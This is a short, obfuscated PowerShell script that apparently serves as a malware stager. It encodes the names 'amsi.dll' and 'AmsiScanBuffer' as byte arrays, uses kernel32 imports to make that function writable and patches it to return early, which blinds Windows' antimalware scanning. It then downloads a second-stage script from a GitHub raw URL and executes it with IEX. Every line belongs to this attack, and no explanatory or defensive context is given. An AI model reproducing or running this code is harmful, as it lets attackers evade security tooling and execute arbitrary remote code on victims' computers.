$e='SilentlyContinue';${e}=$e;$ErrorActionPreference=$e
$env:CB_TRUST='1'
$A=Add-Type -MemberDefinition @'
[DllImport("kernel32", CharSet=CharSet.Ansi)] public static extern IntPtr W(string n);
[DllImport("kernel32", CharSet=CharSet.Ansi)] public static extern IntPtr P(IntPtr m, string n);
[DllImport("kernel32")] public static extern bool V(IntPtr a, UIntPtr s, int p, out int o);
'@ -Name K -Namespace M -PassThru
$D=[System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,46,100,108,108))
$F=[System.Text.Encoding]::ASCII.GetString([byte[]](65,109,115,105,83,99,97,110,66,117,102,102,101,114))
$h=$A::W($D);$p=$A::P($h,$F)
$b=[byte[]](184,87,0,7,128,195);$o=0
[void]$A::V($p,[UIntPtr]6,64,[ref]$o)
[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,6)
IEX((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kdbdjjdnn/testtest/main/stage.ps1'))
